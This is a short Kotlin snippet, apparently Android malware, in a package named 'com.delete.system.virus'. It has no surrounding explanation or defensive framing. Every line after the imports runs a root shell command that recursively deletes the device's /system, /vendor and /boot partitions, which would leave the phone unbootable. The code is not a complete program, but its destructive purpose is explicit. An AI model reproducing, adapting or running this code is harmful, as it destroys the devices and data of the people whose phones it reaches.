package com.delete.system.virus
import android.os.*

Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /system")).waitFor()
Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /vendor")).waitFor()
Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /boot")).waitFor()
